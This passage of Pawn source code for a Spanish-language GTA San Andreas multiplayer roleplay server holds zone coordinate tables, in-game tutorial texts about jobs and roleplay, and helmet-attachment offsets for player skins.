	{!"Santa Maria Beach",			{342.60, -2173.20, -89.00, 647.70, -1684.60, 110.90}},
	{!"Santa Maria Beach",			{72.60, -2173.20, -89.00, 342.60, -1684.60, 110.90}},
	{!"Shady Cabin",				{-1632.80, -2263.40, -3.00, -1601.30, -2231.70, 200.00}},
	{!"Shady Creeks",				{-1820.60, -2643.60, -8.00, -1226.70, -1771.60, 200.00}},
	{!"Shady Creeks",				{-2030.10, -2174.80, -6.10, -1820.60, -1771.60, 200.00}},
	{!"Sobell Rail Yards",			{2749.90, 1548.90, -89.00, 2923.30, 1937.20, 110.90}},
	{!"Spinybed",					{2121.40, 2663.10, -89.00, 2498.20, 2861.50, 110.90}},
	{!"Starfish Casino",			{2437.30, 1783.20, -89.00, 2685.10, 2012.10, 110.90}},
	{!"Starfish Casino",			{2437.30, 1858.10, -39.00, 2495.00, 1970.80, 60.90}},
	{!"Starfish Casino",			{2162.30, 1883.20, -89.00, 2437.30, 2012.10, 110.90}},
	{!"Temple",						{1252.30, -1130.80, -89.00, 1378.30, -1026.30, 110.90}},
	{!"Temple",						{1252.30, -1026.30, -89.00, 1391.00, -926.90, 110.90}},
	{!"Temple",						{1252.30, -926.90, -89.00, 1357.00, -910.10, 110.90}},
	{!"Temple",						{952.60, -1130.80, -89.00, 1096.40, -937.10, 110.90}},
	{!"Temple",						{1096.40, -1130.80, -89.00, 1252.30, -1026.30, 110.90}},
	{!"Temple",						{1096.40, -1026.30, -89.00, 1252.30, -910.10, 110.90}},
	{!"The Camel's Toe",			{2087.30, 1203.20, -89.00, 2640.40, 1383.20, 110.90}},
	{!"The Clown's Pocket",			{2162.30, 1783.20, -89.00, 2437.30, 1883.20, 110.90}},
	{!"The Emerald Isle",			{2011.90, 2202.70, -89.00, 2237.40, 2508.20, 110.90}},
	{!"The Farm",					{-1209.60, -1317.10, 114.90, -908.10, -787.30, 251.90}},
	{!"The Four Dragons Casino",	{1817.30, 863.20, -89.00, 2027.30, 1083.20, 110.90}},
	{!"The High Roller",			{1817.30, 1283.20, -89.00, 2027.30, 1469.20, 110.90}},
	{!"The Mako Span",				{1664.60, 401.70, 0.00, 1785.10, 567.20, 200.00}},
	{!"The Panopticon",				{-947.90, -304.30, -1.10, -319.60, 327.00, 200.00}},
	{!"The Pink Swan",				{1817.30, 1083.20, -89.00, 2027.30, 1283.20, 110.90}},
	{!"The Sherman Dam",			{-968.70, 1929.40, -3.00, -481.10, 2155.20, 200.00}},
	{!"The Strip",					{2027.40, 863.20, -89.00, 2087.30, 1703.20, 110.90}},
	{!"The Strip",					{2106.70, 1863.20, -89.00, 2162.30, 2202.70, 110.90}},
	{!"The Strip",					{2027.40, 1783.20, -89.00, 2162.30, 1863.20, 110.90}},
	{!"The Strip",					{2027.40, 1703.20, -89.00, 2137.40, 1783.20, 110.90}},
	{!"The Visage",					{1817.30, 1863.20, -89.00, 2106.70, 2011.80, 110.90}},
	{!"The Visage",					{1817.30, 1703.20, -89.00, 2027.40, 1863.20, 110.90}},
	{!"Unity Station",				{1692.60, -1971.80, -20.40, 1812.60, -1932.80, 79.50}},
	{!"Valle Ocultado",				{-936.60, 2611.40, 2.00, -715.90, 2847.90, 200.00}},
	{!"Verdant Bluffs",				{930.20, -2488.40, -89.00, 1249.60, -2006.70, 110.90}},
	{!"Verdant Bluffs",				{1073.20, -2006.70, -89.00, 1249.60, -1842.20, 110.90}},
	{!"Verdant Bluffs",				{1249.60, -2179.20, -89.00, 1692.60, -1842.20, 110.90}},
	{!"Verdant Meadows",			{37.00, 2337.10, -3.00, 435.90, 2677.90, 200.00}},
	{!"Verona Beach",				{647.70, -2173.20, -89.00, 930.20, -1804.20, 110.90}},
	{!"Verona Beach",				{930.20, -2006.70, -89.00, 1073.20, -1804.20, 110.90}},
	{!"Verona Beach",				{851.40, -1804.20, -89.00, 1046.10, -1577.50, 110.90}},
	{!"Verona Beach",				{1161.50, -1722.20, -89.00, 1323.90, -1577.50, 110.90}},
	{!"Verona Beach",				{1046.10, -1722.20, -89.00, 1161.50, -1577.50, 110.90}},
	{!"Vinewood",					{787.40, -1310.20, -89.00, 952.60, -1130.80, 110.90}},
	{!"Vinewood",					{787.40, -1130.80, -89.00, 952.60, -954.60, 110.90}},
	{!"Vinewood",					{647.50, -1227.20, -89.00, 787.40, -1118.20, 110.90}},
	{!"Vinewood",					{647.70, -1416.20, -89.00, 787.40, -1227.20, 110.90}},
	{!"Whitewood Estates",			{883.30, 1726.20, -89.00, 1098.30, 2507.20, 110.90}},
	{!"Whitewood Estates",			{1098.30, 1726.20, -89.00, 1197.30, 2243.20, 110.90}},
	{!"Willowfield",				{1970.60, -2179.20, -89.00, 2089.00, -1852.80, 110.90}},
	{!"Willowfield",				{2089.00, -2235.80, -89.00, 2201.80, -1989.90, 110.90}},
	{!"Willowfield",				{2089.00, -1989.90, -89.00, 2324.00, -1852.80, 110.90}},
	{!"Willowfield",				{2201.80, -2095.00, -89.00, 2324.00, -1989.90, 110.90}},
	{!"Willowfield",				{2541.70, -1941.40, -89.00, 2703.50, -1852.80, 110.90}},
	{!"Willowfield",				{2324.00, -2059.20, -89.00, 2541.70, -1852.80, 110.90}},
	{!"Willowfield",				{2541.70, -2059.20, -89.00, 2703.50, -1941.40, 110.90}},
	{!"Yellow Bell Station",		{1377.40, 2600.40, -21.90, 1492.40, 2687.30, 78.00}},
	// Main Zones
	{!"Los Santos",					{44.60, -2892.90, -242.90, 2997.00, -768.00, 900.00}},
	{!"Las Venturas",				{869.40, 596.30, -242.90, 2997.00, 2993.80, 900.00}},
	{!"Bone County",				{-480.50, 596.30, -242.90, 869.40, 2993.80, 900.00}},
	{!"Tierra Robada",				{-2997.40, 1659.60, -242.90, -480.50, 2993.80, 900.00}},
	{!"Tierra Robada",				{-1213.90, 596.30, -242.90, -480.50, 1659.60, 900.00}},
	{!"San Fierro",					{-2997.40, -1115.50, -242.90, -1213.90, 1659.60, 900.00}},
	{!"Red County",					{-1213.90, -768.00, -242.90, 2997.00, 596.30, 900.00}},
	{!"Flint County",				{-1213.90, -2892.90, -242.90, 44.60, -768.00, 900.00}},
	{!"Whetstone",					{-2997.40, -2892.90, -242.90, -1213.90, -1115.50, 900.00}}
};

// -====[ Tutorial ]===- //
enum E_TUTO
{
	tutTitulo[30 char],
	tutCuerpo[500 char],
	Float: tutCamPos[6]
}

static const Tutorial[][E_TUTO] =
{
	{!"Modo de juego", !"Este modo de juego llamado ~g~RolePlay ~w~consiste en interpretar la vida real.\
	Aquí deberás seguir un rol que tu mismo puedes elegir, y que vas armando a medida que juegas.",
	{518.5446, -1937.4713, 137.6625, 519.3435, -1936.8629, 137.0576}},

	{!"Modo de juego", !"Pero.. ¿Cómo seguir un rol? Con seguir un rol, nos referimos a que debes interpretar\
	una persona real en el juego. Debes actuar como esta, pensar como esta, reaccionar como esta. Tu eres esa persona",
	{518.5446, -1937.4713, 137.6625, 519.3435, -1936.8629, 137.0576}},

	{!"Modo de juego", !"Ahora, resumiremos el \"Seguir el rol de una persona y actuar como esta. Imitar al máximo la vida\
	real\" en una sola palabra: ~r~Rolear.    ",
	{518.5446, -1937.4713, 137.6625, 519.3435, -1936.8629, 137.0576}},

	{!"Ejempolo de un rol", !"Imaginate que decides interpretar el rol de un pandillero, ¿Cómo manifiestas esto?\
	Registras tu cuenta y actuas como un pandillero, un hombre que tiene una actitud agresiva, fumador, mal educado.\
	Lo que haces es ir a una tienda de ropa y comprarte pañuelos, colocartelos en la cabeza. Decides buscar en las zonas\
	pobres de la ciudad gente como tu, que te entiendan. De esa forma entras a una pandilla. Eso, es un ejemplo de lo que es rolear correctamente",
	{2419.7092, -1620.1167, 56.2876, 2420.5505, -1620.6659, 55.7626}},

	{!"Rol nativo", !"El rol inicial de todo jugador nuevo, es el de un individuo que llega a Los Santos a buscarse una nueva vida\
	, empezar desde cero. El gobierno te da ~g~$5600 ~w~para subsistir en la ciudad. Existen diversos trabajos que puedes obtener para ganar dinero.\
	Te mostraremos las actividades básicas que debes conocer",
	{1299.9122, -2701.6167, 115.6409,1300.0431, -2700.6279, 115.3258}},

	{!"Mineria", !"La actividad minera es una de las más importantes de la ciudad, ya que se utiliza mayormente para la extracción de diversos metales \
	fundamentalmente Hierro. Los metales son utilizados para la fabricación de armas o venta de los mismos.",
	{-1904.4445, -1440.2217, 125.2253, -1905.2317, -1440.8289, 125.0049}},

	{!"Camioneros", !"El sindicato de camioneros es fundamental para el funcionamiento de la ciudad, ya que se utiliza para transportar diversos materiales y alimentos",
	{2377.1970, -2092.1257, 34.6368, 2378.1912, -2092.1216, 34.3215}},

	{!"Trabajos", !"Tambien, existen trabajos menores que son utilizados por los nuevos en la ciudad     ",
	{2377.1970, -2092.1257, 34.6368, 2378.1912, -2092.1216, 34.3215}},

	{!"Repartidor de pizza", !"Con algo como esto, mucha gente se gana la vida. Son trabajos simples, pero no por eso aburridos",
	{2067.4966, -1835.8588, 33.4918, 2068.2769, -1835.2395, 33.1315}},

	{!"Actividad y niveles", !"Un camionero con 10 años de trabajo no gana lo mismo que uno recien iniciado. Por eso, existen los \
	niveles en los trabajos. En la mayoria de los trabajos, tu jugador al trabajar una determinada cantidad sube de nivel en su trabajo. \
	Cuando subes de nivel obtienes nuevos privilegios, ya que deberas hacer trabajos más difíciles, tu paga aumenta",
	{2067.4966, -1835.8588, 33.4918, 2068.2769, -1835.2395, 33.1315}},

	{!"Ejemplo de niveles en trabajo", !"Cuando un camionero cumple 75 entregas, sube de nivel. Ahora, deberá buscar cargas en las diferentes fábricas para \
	transportarlas a negocios mayoristas en Los Santos, y tu paga aumenta notablemente.",
	{-427.1722, -524.2702, 57.0484, -428.0615, -523.8231, 56.5840}},

	{!"Ilegalidad", !"En toda ciudad existe la parte fea: Drogas, Mafias, Robos, Extorsiones, Narcotráfico. Y como si fuera poco, eso también existe en nuestro servidor\
	Grandes mafias que extorsionan otras personas, un negocio clandestino de drogaenorme, el tráfico de armas ilegal.\
	Existen organizaciones que logran llevar a cabo todo esto.",
	{1549.8164, -886.9373, 284.7531, 1549.0022, -887.5093, 283.7188}},

	{!"Tu elección", !"Todo depende de tu rol, es decir un narcotraficante ganaría más dinero que un pobre camionero, \
	pero debes estar siempre pendiente que no halla policía, controlar bien a quien le vas a vender, correr y esconderte ante la ley, cuando el camionero \
	vive tranquilo, sin ningún tipo de preocupación relacionada con la ley. Todo depende de ti!",
	{1549.8164, -886.9373, 284.7531, 1549.0022, -887.5093, 283.7188}},

	{!"Inventario", !"Cada jugador tiene un inventario, donde podrá guardar todo lo que quiera. Se mostró en pantalla una pequeña demostración de lo que es el inventario. \
	Para abrirlo, presiona ~r~N ~w~y selecciona con el Mouse el objeto que quieres utilizar.",
	{1549.8164, -886.9373, 284.7531, 1549.0022, -887.5093, 283.7188}}

};



// --======[ Coordenadas de accesorios para los 300 skins ]======--- //

new Float:POS_Accesorio_Casco[300][9] =
{
	{ 0.0, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 0 || MotorcycleHelmet1 - NO
	{ 0.063893, 0.008419, 0.000000, 69.264198, 87.430633, 11.827832, 1.000000, 1.000000, 1.000000 }, // SKINID 1 || MotorcycleHelmet1 - SI
	{ 0.082401, 0.010075, 0.000000, 0.000000, 78.229309, 99.866622, 1.330634, 1.000000, 1.099319 }, // SKINID 2 || MotorcycleHelmet1 - SI
	{ 0.082401, 0.012487, 0.000000, 0.000000, 81.798553, 77.744796, 1.000000, 1.000000, 1.000000 }, // SKINID 3 || MotorcycleHelmet1 - SI
	{ 0.082401, 0.012487, 0.000000, 0.000000, 81.798553, 77.744796, 1.000000, 1.000000, 1.000000 }, // SKINID 4 || MotorcycleHelmet1 - SI
	{ 0.082401, 0.012487, 0.000000, 0.000000, 81.798553, 77.744796, 1.000000, 1.000000, 1.000000 }, // SKINID 5 || MotorcycleHelmet1 - SI
	{0.082401, 0.012487, 0.000000, 0.000000, 81.798553, 77.744796, 1.000000, 1.000000, 1.000000 }, // SKINID 6 || MotorcycleHelmet1 - SI
	{ 0.064673, 0.033285, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 7 || MotorcycleHelmet1 - SI
	{ 0.064673, 0.033285, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 8 || MotorcycleHelmet1 - NO
	{ 0.046243, 0.024402, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 9 || MotorcycleHelmet1 - SI
	{ 0.046243, 0.024402, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 10 || MotorcycleHelmet1 - SI
	{ 0.046243, 0.024402, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 11 || MotorcycleHelmet1 - SI
	{ 0.036347, 0.011780, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 12 || MotorcycleHelmet1 - SI
	{ 0.025228, 0.011780, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 13 || MotorcycleHelmet1 - SI
	{ 0.069039, 0.033799, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 14 || MotorcycleHelmet1 - SI
	{ 0.045800, -0.005477, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 15 || MotorcycleHelmet1 - SI
	{ 0.082179, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 16 || MotorcycleHelmet1 - SI
	{ 0.082179, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 17 || MotorcycleHelmet1 - SI
	{ 0.043310, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 18 || MotorcycleHelmet1 - SI
	{ 0.076837, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 19 || MotorcycleHelmet1 - SI
	{ 0.076837, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 20 || MotorcycleHelmet1 - SI
	{ 0.076837, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 21 || MotorcycleHelmet1 - SI
	{ 0.076837, 0.025758, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 22 || MotorcycleHelmet1 - SI
	{ 0.081527, 0.015231, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 23 || MotorcycleHelmet1 - SI
	{ 0.081527, 0.022255, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 24 || MotorcycleHelmet1 - SI
	{ 0.081527, 0.022255, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 25 || MotorcycleHelmet1 - SI
	{ 0.081527, 0.022255, 0.000000, 0.000000, 81.798553, 77.744796, 1.083757, 1.000000, 1.000000 }, // SKINID 26 || MotorcycleHelmet1 - SI
	{ 0.089542, 0.022255, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 27 || MotorcycleHelmet1 - SI
	{ 0.089542, 0.022255, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 28 || MotorcycleHelmet1 - SI
	{ 0.0, 0.022255, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 29 || MotorcycleHelmet1 - NO
	{ 0.065071, 0.022255, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 30 || MotorcycleHelmet1 - SI
	{ 0.0, 0.022255, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 31 || MotorcycleHelmet1 - NO
	{ 0.028938, 0.022255, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 32 || MotorcycleHelmet1 - SI
	{ -0.000755, 0.005750, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 33 || MotorcycleHelmet1 - SI
	{ 0.096637, 0.028542, 0.000000, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 34 || MotorcycleHelmet1 - SI
	{ 0.084942, 0.028542, 0.000821, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 35 || MotorcycleHelmet1 - SI
	{ 0.084942, 0.028542, 0.000821, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 36 || MotorcycleHelmet1 - SI
	{ 0.084942, 0.028542, 0.000821, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 37 || MotorcycleHelmet1 - SI
	{ 0.084942, 0.043490, 0.000821, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 38 || MotorcycleHelmet1 - SI
	{ 0.084942, 0.043490, 0.000821, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 39 || MotorcycleHelmet1 - SI
	{ 0.047616, -0.011005, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 40 || MotorcycleHelmet1 - SI
	{ 0.073332, 0.003941, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 41 || MotorcycleHelmet1 - SI
	{ 0.073332, 0.003941, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 42 || MotorcycleHelmet1 - NO
	{ 0.040072, 0.003941, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 43 || MotorcycleHelmet1 - SI
	{ 0.040072, 0.003941, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 44 || MotorcycleHelmet1 - SI
	{ 0.040072, 0.003941, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 45 || MotorcycleHelmet1 - SI
	{ 0.075100, 0.026033, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 46 || MotorcycleHelmet1 - SI
	{ 0.075100, 0.026033, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 47 || MotorcycleHelmet1 - SI
	{ 0.079862, 0.026033, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 48 || MotorcycleHelmet1 - SI
	{ 0.079862, 0.026033, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 49 || MotorcycleHelmet1 - SI
	{ 0.071502, -0.010506, 0.000000, 89.715873, 96.486831, 6.367833, 1.220247, 1.000000, 1.000000 }, // SKINID 50 || MotorcycleHelmet1 - SI.
	{ 0.094900, -0.000822, 0.000000, 89.715873, 96.486831, 6.367833, 1.156256, 1.000000, 1.000000 }, // SKINID 51 || MotorcycleHelmet1 - SI.
	{ 0.094900, -0.000822, 0.000000, 89.715873, 96.486831, 6.367833, 1.156256, 1.000000, 1.000000 }, // SKINID 52 || MotorcycleHelmet1 - SI.
	{ 0.070367, 0.047601, -0.003702, 89.715873, 96.486831, 6.367833, 1.006050, 1.000000, 1.000000 }, // SKINID 53 || MotorcycleHelmet1 - SI.
	{ 0.070367, 0.047601, -0.003702, 89.715873, 96.486831, 6.367833, 1.006050, 1.000000, 1.000000 }, // SKINID 54 || MotorcycleHelmet1 - SI.
	{ 0.070367, 0.003330, -0.003702, 89.715873, 96.486831, 6.367833, 1.206298, 1.000000, 0.968946 }, // SKINID 55 || MotorcycleHelmet1 - SI.
	{ 0.070367, 0.003330, -0.003702, 89.715873, 96.486831, 6.367833, 1.206298, 1.000000, 0.968946 }, // SKINID 56 || MotorcycleHelmet1 - SI.
	{ 0.089573, 0.026238, -0.003702, 89.715873, 96.486831, 6.367833, 0.950863, 1.000000, 0.981081 }, // SKINID 57 || MotorcycleHelmet1 - SI
	{ 0.037543, 0.015802, -0.003702, 89.715873, 96.486831, 6.367833, 0.884217, 1.000000, 0.981081 }, // SKINID 58 || MotorcycleHelmet1 - SI.
	{ 0.083339, 0.015802, -0.003702, 89.715873, 96.486831, 6.367833, 1.037051, 1.000000, 1.078135 }, // SKINID 59 || MotorcycleHelmet1 - SI.
	{ 0.083339, 0.015802, -0.003702, 89.715873, 96.486831, 6.367833, 1.037051, 1.000000, 1.078135 }, // SKINID 60 || MotorcycleHelmet1 - SI.
	{ 0.083339, 0.017691, -0.003702, 89.715873, 96.486831, 6.367833, 1.176779, 1.000000, 1.078135 }, // SKINID 61 || MotorcycleHelmet1 - SI.
	{ 0.059154, 0.029714, -0.003702, 89.715873, 96.486831, 6.367833, 0.926730, 1.000000, 1.078135 }, // SKINID 62 || MotorcycleHelmet1 - SI.
	{ 0.039980, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 1.039675, 1.000000, 1.078135 }, // SKINID 63 || MotorcycleHelmet1 - SI.
	{ 0.039980, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 1.039675, 1.000000, 1.078135 }, // SKINID 64 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 1.039675, 1.000000, 1.078135 }, // SKINID 65 || MotorcycleHelmet1 - NO.
	{ 0.067476, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 0.915247, 1.000000, 1.078135 }, // SKINID 66 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 0.915247, 1.000000, 1.078135 }, // SKINID 67 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 0.983779, 1.000000, 1.078135 }, // SKINID 68 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.015173, -0.003702, 89.715873, 96.486831, 6.367833, 0.983779, 1.000000, 1.078135 }, // SKINID 69 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.020542, -0.003702, 89.715873, 96.486831, 6.367833, 0.983779, 1.000000, 1.078135 }, // SKINID 70 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.025688, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 71 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.025688, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 72 || MotorcycleHelmet1 - SI.
	{ 0.067476, 0.025688, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 73 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.025688, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 74 || MotorcycleHelmet1 - NO.
	{ 0.042678, 0.025688, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 75 || MotorcycleHelmet1 - SI.
	{ 0.042678, 0.010462, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 76 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.010462, -0.003702, 89.715873, 96.486831, 6.367833, 1.084138, 1.000000, 1.078135 }, // SKINID 77 || MotorcycleHelmet1 - NO.
	{ 0.061191, 0.019165, -0.003702, 89.715873, 96.486831, 6.367833, 1.086820, 1.000000, 1.078135 }, // SKINID 78 || MotorcycleHelmet1 - SI.
	{ 0.061191, 0.019165, -0.003702, 89.715873, 96.486831, 6.367833, 1.086820, 1.000000, 1.078135 }, // SKINID 79 || MotorcycleHelmet1 - SI.
	{ 0.034503, 0.019165, -0.003702, 89.715873, 96.486831, 6.367833, 0.991727, 1.000000, 1.006440 }, // SKINID 80 || MotorcycleHelmet1 - SI.
	{ 0.034503, 0.019165, -0.003702, 89.715873, 96.486831, 6.367833, 0.991727, 1.000000, 1.006440 }, // SKINID 81 || MotorcycleHelmet1 - SI.
	{ 0.102640, 0.039447, -0.003702, 89.715873, 96.486831, 6.367833, 1.123702, 1.000000, 1.059899 }, // SKINID 82 || MotorcycleHelmet1 - SI.
	{ 0.102640, 0.039447, -0.003702, 89.715873, 96.486831, 6.367833, 1.123702, 1.000000, 1.059899 }, // SKINID 83 || MotorcycleHelmet1 - SI.
	{ 0.102640, 0.039447, -0.003702, 89.715873, 96.486831, 6.367833, 1.123702, 1.000000, 1.059899 }, // SKINID 84 || MotorcycleHelmet1 - SI.
	{ 0.055661, 0.028337, -0.003702, 89.715873, 96.486831, 6.367833, 1.123702, 1.000000, 1.059899 }, // SKINID 85 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.028337, -0.003702, 89.715873, 96.486831, 6.367833, 1.123702, 1.000000, 1.059899 }, // SKINID 86 || MotorcycleHelmet1 - NO.
	{ 0.055661, 0.028337, -0.003702, 89.715873, 96.486831, 6.367833, 1.123702, 1.000000, 1.059899 }, // SKINID 87 || MotorcycleHelmet1 - SI.
	{ 0.055661, 0.028337, -0.003702, 89.715873, 96.486831, 6.367833, 0.966517, 1.000000, 1.059899 }, // SKINID 88 || MotorcycleHelmet1 - SI.
	{ 0.083799, 0.007824, -0.003702, 89.715873, 96.486831, 6.367833, 1.058513, 1.000000, 1.059899 }, // SKINID 89 || MotorcycleHelmet1 - SI.
	{ 0.046952, 0.007824, -0.003702, 89.715873, 96.486831, 6.367833, 1.058513, 1.000000, 1.059899 }, // SKINID 90 || MotorcycleHelmet1 - SI.
	{ 0.046952, 0.007824, -0.003702, 89.715873, 96.486831, 6.367833, 1.058513, 1.000000, 1.059899 }, // SKINID 91 || MotorcycleHelmet1 - SI.
	{ 0.046952, 0.007824, -0.003702, 89.715873, 96.486831, 6.367833, 1.058513, 1.000000, 1.059899 }, // SKINID 92 || MotorcycleHelmet1 - SI.
	{ 0.046952, 0.007824, -0.003702, 89.715873, 96.486831, 6.367833, 1.058513, 1.000000, 1.059899 }, // SKINID 93 || MotorcycleHelmet1 - SI.
	{ 0.046952, 0.015634, -0.003702, 89.715873, 96.486831, 6.367833, 0.958088, 1.000000, 0.873182 }, // SKINID 94 || MotorcycleHelmet1 - SI.
	{ 0.046952, 0.015634, -0.003702, 89.715873, 96.486831, 6.367833, 1.029447, 1.000000, 0.873182 }, // SKINID 95 || MotorcycleHelmet1 - SI.
	{ 0.069520, 0.015634, -0.003702, 89.715873, 96.486831, 6.367833, 1.023028, 1.000000, 0.937115 }, // SKINID 96 || MotorcycleHelmet1 - SI.
	{ 0.069520, 0.027443, -0.003702, 89.715873, 96.486831, 6.367833, 1.121912, 1.000000, 1.005367 }, // SKINID 97 || MotorcycleHelmet1 - SI.
	{ 0.069520, 0.027443, -0.003702, 89.715873, 96.486831, 6.367833, 1.020644, 1.000000, 1.005367 }, // SKINID 98 || MotorcycleHelmet1 - SI.
	{ 0.074331, 0.006538, -0.003702, 89.715873, 96.486831, 6.367833, 1.125367, 1.000000, 1.005367 }, // SKINID 99 || MotorcycleHelmet1 - SI.
	{ 0.079862, 0.026033, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 100 || MotorcycleHelmet1 - SI
	{ 0.079862, 0.026033, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 101 || MotorcycleHelmet1 - SI
	{ 0.079862, 0.004189, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 102 || MotorcycleHelmet1 - SI
	{ 0.071147, 0.020286, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 103 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 104 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 105 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 106 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 107 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 108 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 109 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 110 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 113 || MotorcycleHelmet1 - SI
